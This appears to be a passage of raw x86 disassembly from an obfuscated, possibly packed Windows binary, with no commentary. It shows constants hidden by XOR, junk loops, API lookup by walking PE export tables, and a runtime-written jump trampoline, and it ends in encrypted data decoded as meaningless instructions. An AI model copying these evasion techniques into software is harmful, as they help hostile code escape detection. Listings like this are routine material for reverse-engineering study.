  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [edi+ebp*8+0x5f340cab],edx
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	icebp  
  4058fb:	xor    DWORD PTR [edx-0x47],ecx
  4058fe:	scas   eax,DWORD PTR es:[edi]
  4058ff:	ds enter 0xec60,0x94
  405904:	out    0x53,al
  405906:	(bad)  
  405907:	cld    
  405908:	adc    bl,BYTE PTR [ebx]
  40590a:	into   
  40590b:	cli    
  40590c:	jecxz  0x40591a
  40590e:	mov    al,ds:0x322f04bd
  405913:	lea    ebp,[esi-0x3ff58f4a]
  405919:	xor    al,0x48
  40591b:	sub    ebx,DWORD PTR [esi+0x13]
  40591e:	sub    DWORD PTR [esi-0x8085bf],0xc775d19c
  405928:	push   edi
  405929:	adc    eax,0xbaf58429
  40592e:	mov    ebp,0xa9705e5
  405933:	fs and eax,0xf6bb36ec
  405939:	mov    ch,0x45
  40593b:	rol    DWORD PTR [edx-0x11],1
  40593e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40593f:	dec    edi
  405940:	jae    0x40597a
  405942:	je     0x405952
  405944:	mov    WORD PTR [eax-0x1c3e9791],fs
  40594a:	(bad)  
  40594b:	or     ebp,esp
  40594d:	dec    DWORD PTR [edx+0x5d]
  405950:	fld    TBYTE PTR [ebx+0x1b52362e]
  405956:	dec    edi
  405957:	xor    cl,BYTE PTR [eax]
  405959:	xor    DWORD PTR [edi-0x1c95f7f6],ecx
  40595f:	push   0x17
  405961:	jns    0x40591f
  405963:	push   ss
  405964:	mul    BYTE PTR [edi+0x1739b968]
  40596a:	push   ebp
  40596b:	jae    0x405977
  40596d:	sbb    al,0x64
  40596f:	jge    0x40595a
  405971:	and    ch,BYTE PTR [edi-0x7ee69516]
  405977:	mov    ch,0x61
  405979:	clc    
  40597a:	loopne 0x4059cc
  40597c:	cmp    eax,0x12bce50d
  405981:	call   0xbc89dfc8
  405986:	(bad)  
  405987:	mov    edi,0xba7b7cc7
  40598c:	rol    dl,1
  40598e:	xchg   DWORD PTR [edi+0x51],esp
  405991:	lods   al,BYTE PTR ds:[esi]
  405992:	xor    al,0x56
  405994:	sub    BYTE PTR [ecx-0x671d0ee9],0xab
  40599b:	or     esp,DWORD PTR [ebx-0x36172f17]
  4059a1:	cmp    BYTE PTR [edi],bl
  4059a3:	jecxz  0x405a07
  4059a5:	jle    0x4059ce
  4059a7:	mov    ch,0x52
  4059a9:	rcl    DWORD PTR [edi+0xd],cl
  4059ac:	pop    es
  4059ad:	cmp    bl,BYTE PTR ds:0xd2bb5c52
  4059b3:	mov    ah,0x70
  4059b5:	aas    
  4059b6:	cdq    
  4059b7:	adc    DWORD PTR [ecx-0x21b10e4],ebx
  4059bd:	fsub   DWORD PTR [ecx]
  4059bf:	dec    edx
  4059c0:	cmp    BYTE PTR [edi+ecx*2+0xe53dccd],ah
  4059c7:	jb     0x4059c1
  4059c9:	push   eax
  4059ca:	(bad)  
  4059cb:	call   0x3def2aa1
  4059d0:	sahf   
  4059d1:	ss nop
  4059d3:	push   edi
  4059d4:	mov    dh,0xd0
  4059d6:	mov    ebx,DWORD PTR ds:0x63f4f254
  4059dc:	scas   eax,DWORD PTR es:[edi]
  4059dd:	ja     0x4059c2
  4059df:	pop    edi
  4059e0:	xchg   edi,eax
  4059e1:	or     DWORD PTR [edi+0x7e],esi
  4059e4:	jl     0x40598a
  4059e6:	leave  
  4059e7:	clc    
  4059e8:	popa   
  4059e9:	repz daa 
  4059eb:	add    DWORD PTR [edx-0x68],esp
  4059ee:	push   ebp
  4059ef:	gs inc eax
  4059f1:	daa    
  4059f2:	cmp    eax,0xd80391a7
  4059f7:	push   ds
  4059f8:	and    al,0x78
  4059fa:	xchg   ebp,eax
  4059fb:	stos   DWORD PTR es:[edi],eax
  4059fc:	test   DWORD PTR [ecx],0x3e264062
  405a02:	cs jo  0x4059e5
  405a05:	ins    DWORD PTR es:[edi],dx
  405a06:	icebp  
  405a07:	mov    ebx,0x3bab5315
  405a0c:	inc    ecx
  405a0d:	jmp    DWORD PTR [esi+0x15]
  405a10:	idiv   esi
  405a12:	ret    
  405a13:	out    0xd2,eax
  405a15:	inc    edx
  405a16:	int    0x2b
  405a18:	inc    esi
  405a19:	pop    ss
  405a1a:	adc    al,ch
  405a1c:	lock icebp 
  405a1e:	outs   dx,DWORD PTR ds:[esi]
  405a1f:	jmp    FWORD PTR [ebx]
  405a21:	retf   
  405a22:	pop    edi
  405a23:	cmp    eax,0x69aaade
  405a28:	pop    edx
  405a29:	ret    0x788f
  405a2c:	xchg   esi,eax
  405a2d:	or     edx,DWORD PTR cs:0xbfdf269b
  405a34:	retf   
  405a35:	stc    
  405a36:	lahf   
  405a37:	lods   al,BYTE PTR ds:[esi]
  405a38:	add    ch,dh
  405a3a:	pop    esp
  405a3b:	mov    ebx,0xded459eb
  405a40:	lea    ebp,[edi+0xb9f7b8f]
  405a46:	dec    ebx
  405a47:	mov    ?,WORD PTR [edi]
  405a49:	ins    BYTE PTR es:[edi],dx
  405a4a:	and    al,ah
  405a4c:	jno    0x405a43
  405a4e:	and    DWORD PTR [eax+0x6397462c],0x2d66d535
  405a58:	aaa    
  405a59:	test   al,0xd6
  405a5b:	aas    
  405a5c:	jge    0x405a87
  405a5e:	in     eax,0x6b
  405a60:	mov    ds:0x7292963b,eax
  405a65:	jle    0x405a51
  405a67:	(bad)  
  405a68:	arpl   WORD PTR [esi-0x6bb74203],sp
  405a6e:	std    
  405a6f:	sbb    dl,ah
  405a71:	sbb    ah,BYTE PTR [ecx+0x15]
  405a74:	fisub  DWORD PTR ss:[ebx+0x306426a4]
  405a7b:	frstor [esi-0x5abdc98d]
  405a81:	mov    eax,0x10621ae8
  405a86:	dec    edx
  405a87:	mov    bh,0xcc
  405a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a8a:	cwde   
  405a8b:	test   bl,ch
  405a8d:	fwait
  405a8e:	dec    ecx
  405a8f:	push   0xffffffd3
  405a91:	or     cl,BYTE PTR [ecx+ebx*2]
  405a94:	jmp    0x405a46
  405a96:	in     al,0x98
  405a98:	or     DWORD PTR [ebx+0x4478b700],ebp
  405a9e:	sub    BYTE PTR [edx+0x70],ah
  405aa1:	push   es
  405aa2:	aas    
  405aa3:	jp     0x405adb
  405aa5:	les    eax,FWORD PTR [eax-0x13]
  405aa8:	or     eax,0x8646453c
  405aad:	outs   dx,DWORD PTR ds:[esi]
  405aae:	lods   eax,DWORD PTR ds:[esi]
  405aaf:	inc    edx
  405ab0:	or     BYTE PTR [ebx-0x40b1b5a5],cl
  405ab6:	push   ecx
  405ab7:	retf   
  405ab8:	das    
  405ab9:	sub    cl,BYTE PTR [edx]
  405abb:	and    bh,BYTE PTR [eax+0x72]
  405abe:	repnz mov eax,0x36035686
  405ac4:	add    BYTE PTR [esi],dl
  405ac6:	push   cs
  405ac7:	jno    0x405b17
  405ac9:	out    dx,eax
  405aca:	fsub   QWORD PTR [ebp+0x2b]
  405acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ace:	ret    0xd533
  405ad1:	cs pop ds
  405ad3:	int    0x94
  405ad5:	push   cs
  405ad6:	(bad)  
  405ad8:	jo     0x405abe
  405ada:	sbb    BYTE PTR [ebx+0x1cf9c938],dl
  405ae0:	push   ebp
  405ae1:	mov    ss,WORD PTR [edi+ecx*1+0xf]
  405ae5:	mov    bl,0xcd
  405ae7:	outs   dx,DWORD PTR ds:[esi]
  405ae8:	stos   DWORD PTR es:[edi],eax
  405ae9:	out    dx,al
  405aea:	je     0x405a83
  405aec:	cwde   
  405aed:	xchg   DWORD PTR [eax+ecx*4+0xe],edi
  405af1:	mov    ?,eax
  405af3:	rcl    ch,cl
  405af5:	add    DWORD PTR [edi-0x5c12240c],0x1e
  405afc:	retf   
  405afd:	push   cs
  405afe:	mov    ebp,0xa056c99b
  405b03:	jl     0x405b05
  405b05:	push   0x4c
  405b07:	mov    bh,0x88
  405b09:	mov    edi,0x768a6178
  405b0e:	in     al,0x78
  405b10:	dec    eax
  405b11:	pop    esi
  405b12:	not    DWORD PTR [edi-0x5e]
  405b15:	xlat   BYTE PTR ds:[ebx]
  405b16:	pop    ss
  405b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b18:	xchg   ebx,eax
  405b19:	xor    al,0xfa
